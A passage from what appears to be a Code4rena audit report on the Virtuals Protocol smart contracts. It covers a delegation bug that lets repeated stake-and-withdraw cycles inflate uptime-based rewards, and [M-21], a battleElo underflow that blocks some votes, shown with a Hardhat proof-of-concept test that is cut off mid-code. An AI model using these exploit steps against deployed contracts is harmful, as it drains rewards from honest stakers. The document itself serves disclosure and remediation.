<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_burn</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_balanceCheckpoints</span><span class="mtk1">[</span><span class="mtk12">sender</span><span class="mtk1">].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk11">clock</span><span class="mtk1">(), </span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint208</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">)));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>Once maturity is reached, a malicious user can exploit this flaw by:</p>
<ul>
<li>The user stakes tokens and delegates.</li>
<li>Then immediately withdraws them when maturity.</li>
<li>Repeats the cycle multiple times, possibly in the same block.</li>
</ul>
<p>Each cycle leaves delegation entries intact while reducing the actual staked balance to zero.</p>
<p>The system uses <code>getPastDelegates()</code> in reward logic to compute historical rewards based on:</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204</a></p>
<pre data-index="105" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getClaimableStakerRewards</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">totalClaimable</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">numRewards</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Claim</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">claim</span><span class="mtk1"> = </span><span class="mtk12">_stakerClaims</span><span class="mtk1">[</span><span class="mtk12">account</span><span class="mtk1">][</span><span class="mtk12">virtualId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">numRewards</span><span class="mtk1"> = </span><span class="mtk10">Math</span><span class="mtk1">.</span><span class="mtk11">min</span><span class="mtk1">(</span><span class="mtk12">LOOP_LIMIT</span><span class="mtk1"> + </span><span class="mtk12">claim</span><span class="mtk1">.</span><span class="mtk12">rewardCount</span><span class="mtk1">, </span><span class="mtk11">getAgentRewardCount</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAgentVeToken</span><span class="mtk1"> </span><span class="mtk12">veToken</span><span class="mtk1"> = </span><span class="mtk11">IAgentVeToken</span><span class="mtk1">(</span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">agentNft</span><span class="mtk1">).</span><span class="mtk11">virtualLP</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">).</span><span class="mtk12">veToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAgentDAO</span><span class="mtk1"> </span><span class="mtk12">dao</span><span class="mtk1"> = </span><span class="mtk11">IAgentDAO</span><span class="mtk1">(</span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">agentNft</span><span class="mtk1">).</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">).</span><span class="mtk12">dao</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk12">claim</span><span class="mtk1">.</span><span class="mtk12">rewardCount</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">numRewards</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">AgentReward</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">agentReward</span><span class="mtk1"> = </span><span class="mtk11">getAgentReward</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">i</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">Reward</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1"> = </span><span class="mtk11">getReward</span><span class="mtk1">(</span><span class="mtk12">agentReward</span><span class="mtk1">.</span><span class="mtk12">rewardIndex</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;          </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1"> = </span><span class="mtk12">veToken</span><span class="mtk1">.</span><span class="mtk11">getPastDelegates</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">.</span><span class="mtk12">blockNumber</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">uptime</span><span class="mtk1"> = </span><span class="mtk12">dao</span><span class="mtk1">.</span><span class="mtk11">getPastScore</span><span class="mtk1">(</span><span class="mtk12">delegatee</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">.</span><span class="mtk12">blockNumber</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">stakedAmount</span><span class="mtk1"> = </span><span class="mtk12">veToken</span><span class="mtk1">.</span><span class="mtk11">getPastBalanceOf</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">.</span><span class="mtk12">blockNumber</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">stakerReward</span><span class="mtk1"> = (</span><span class="mtk12">agentReward</span><span class="mtk1">.</span><span class="mtk12">stakerAmount</span><span class="mtk1"> * </span><span class="mtk12">stakedAmount</span><span class="mtk1">) / </span><span class="mtk12">agentReward</span><span class="mtk1">.</span><span class="mtk12">totalStaked</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">stakerReward</span><span class="mtk1"> = (</span><span class="mtk12">stakerReward</span><span class="mtk1"> * </span><span class="mtk12">uptime</span><span class="mtk1">) / </span><span class="mtk12">agentReward</span><span class="mtk1">.</span><span class="mtk12">totalProposals</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">totalClaimable</span><span class="mtk1"> += </span><span class="mtk12">stakerReward</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>As a result, repeated delegation records combined with zeroed balances allow the delegatee to appear historically more active, and to receive inflated uptime-based rewards; even though the stake was not present at the time.</p>
<h3 style="position:relative;" id="impact-14"><a class="anchor before" aria-label="impact 14 permalink" href="#impact-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Reward distribution becomes exploitable by staking and undelegating rapidly after maturity.</li>
<li>Delegatees receive excessive rewards due to inflated uptime scores based on <code>getPastDelegates()</code>.</li>
<li>Governance power and monetary reward flows become decoupled from actual stake and participation.</li>
<li>Fairness of the protocol is compromised; malicious users can game the system at the expense of honest stakers and voters.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-24"><a class="anchor before" aria-label="recommended mitigation steps 24 permalink" href="#recommended-mitigation-steps-24"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Update the <code>withdraw()</code> function to automatically clear a user’s delegation when their token balance drops to zero. This prevents the retention of voting power or reward eligibility after the staker has exited.</p>
<hr>
<h2 style="position:relative;" id="m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting"><a class="anchor before" aria-label="m 21 battleelo is at risk of underflow revert which may dos voting permalink" href="#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-165">[M-21] <code>battleElo</code> is at risk of underflow revert, which may DOS voting</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-774">oakcobalt</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-412">testnate</a></em></p>
<p>In EloCalculator.sol, the <code>battleElo()</code> function calculates a new maturity score based on a series of battle results:</p>
<pre data-index="106" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">battleElo</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">currentRating</span><span class="mtk1">, </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">battles</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">eloA</span><span class="mtk1"> = </span><span class="mtk7">1000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">eloB</span><span class="mtk1"> = </span><span class="mtk7">1000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">battles</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">result</span><span class="mtk1"> = </span><span class="mtk11">mapBattleResultToGameResult</span><span class="mtk1">(</span><span class="mtk12">battles</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">change</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">negative</span><span class="mtk1">) = </span><span class="mtk12">Elo</span><span class="mtk1">.</span><span class="mtk11">ratingChange</span><span class="mtk1">(</span><span class="mtk12">eloB</span><span class="mtk1">, </span><span class="mtk12">eloA</span><span class="mtk1">, </span><span class="mtk12">result</span><span class="mtk1">, </span><span class="mtk12">k</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">change</span><span class="mtk1"> = </span><span class="mtk11">_roundUp</span><span class="mtk1">(</span><span class="mtk12">change</span><span class="mtk1">, </span><span class="mtk7">100</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">negative</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eloA</span><span class="mtk1"> -= </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eloB</span><span class="mtk1"> += </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eloA</span><span class="mtk1"> += </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eloB</span><span class="mtk1"> -= </span><span class="mtk12">change</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">currentRating</span><span class="mtk1"> + </span><span class="mtk12">eloA</span><span class="mtk1"> - </span><span class="mtk7">1000</span><span class="mtk1">; </span><span class="mtk3">//@audit Potential underflow here</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54</a></p>
<p>When calculating results of a series of battle, battleElo will subtract <code>currentRating</code> by the difference in rate change. <code>currentRating + eloA - 1000</code></p>
<p>Under current AgentDao implementation in <code>_castVote</code> → <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L139"><code>_updateMaturity</code></a> → <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189"><code>_calcMaturity</code></a>, <code>uint8[] memory battles</code> can result in a negative change to the <code>currentRating</code>. This case is allowed in the protocol because we see <code>ServiceNft</code> handles the case when <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L94-L96"><code>_maturities[proposalId] &lt; _maturities[prevServiceId]</code></a> in <code>updateImpact</code>.</p>
<p>When a validator casts a vote that results in a negative change in currentRating, this might cause <code>currentRating + eloA - 1000</code> underflow revert when <code>currentRating</code> is already low.</p>
<h3 style="position:relative;" id="impact-15"><a class="anchor before" aria-label="impact 15 permalink" href="#impact-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>DOS conditions:</p>
<ul>
<li>Validators may be unable to submit valid votes with specific battle results.</li>
<li>The governance mechanism may be partially blocked for low-maturity services.</li>
<li>The voting process could be disrupted when trying to express certain opinions.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-25"><a class="anchor before" aria-label="recommended mitigation steps 25 permalink" href="#recommended-mitigation-steps-25"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>In <code>battleElo</code>, consider checking and handling <code>currentRating + eloA - 1000</code> underflow case and return a minimal rating value when the underflow case is triggered.</p>
<h3 style="position:relative;" id="proof-of-concept-15"><a class="anchor before" aria-label="proof of concept 15 permalink" href="#proof-of-concept-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Test logics:</p>
<ol>
<li>Base proposal: <code>proposal1</code> executed.</li>
<li>Check <code>proposal1</code>’s maturity.</li>
<li><code>validatorA</code>’s voting power is twice as <code>validatorB</code>.</li>
<li><code>proposal2</code> is created (intended as an upgrade from <code>proposal1</code>).</li>
<li><code>validatorA</code> cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0].</li>
<li><code>castVote</code> revert due to underflow. <code>castVote</code> with specific results DOSsed.</li>
</ol>
<p>Added unit test <code>underflow DOS certain voting</code> in <code>test/rewardsV2.js</code>. Run test with: <code>npx hardhat test test/rewardsV2.js</code>:</p>
<details>
<pre data-index="107" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">it.only("underflow DOS certain voting", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    //setup:</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 1. base proposal: proposal1 executed</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 2. check proposal1's maturity</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 3. validatorA's voting power is twice as validatorB.</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 4. proposal2 is created (intended as an upgrade from proposal1)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 5. validatorA cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // 6. castVote revert due to underflow. castVote with specific results DOSsed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await loadFixture(deployWithAgent);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { serviceNft, contributionNft, agentNft, virtualToken } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      founder,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor2,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      validator1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      validator2,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      trader,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setup LP and voting power</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "AgentToken",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      base.agent.token</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const veToken = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "AgentVeToken",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      base.agent.veToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const lp = await ethers.getContractAt("IERC20", base.agent.lp);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Delegate founder's votes to validator1 (founder holds a large amount of tokens)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await veToken.connect(founder).delegate(validator1.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Set up validator2 with LP tokens - similar to the validator uptime test</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const router = await ethers.getContractAt(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "IUniswapV2Router02",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.UNISWAP_ROUTER</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Verify voting power</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const daoAddr = (await agentNft.virtualInfo(1)).dao;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentDAO = await ethers.getContractAt("AgentDAO", daoAddr);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const validator1Votes = await veToken.getVotes(validator1.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Validator1 votes:", formatEther(validator1Votes));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 1: Create base proposal and get it executed</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const proposalId1 = await createContribution(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1, // virtualId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // coreId (Cognitive Core)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // parentId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true, // isModel</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // no dataset dependency</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Base contribution",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor1.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [validator1], // Only validator1 votes on this one</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 2: Check proposalId1's maturity</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const maturity1 = await serviceNft.getMaturity(proposalId1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Base proposal maturity:", maturity1.toString());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(maturity1).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 3: Create proposal2 (intended as an upgrade)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const descHash2 = getDescHash("Improved contribution");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const mintCalldata2 = await getMintServiceCalldata(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      serviceNft,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      descHash2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentDAO.propose(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [serviceNft.target],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [0],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [mintCalldata2],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Improved contribution"</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Get the proposalId</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const events = await agentDAO.queryFilter(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agentDAO.filters.ProposalCreated,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      -1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const proposalId2 = events[events.length - 1].args[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Create contribution NFT</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await contributionNft.mint(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      contributor2.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      1, // virtualId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0, // coreId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      TOKEN_URI,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      proposalId2,</span></span>
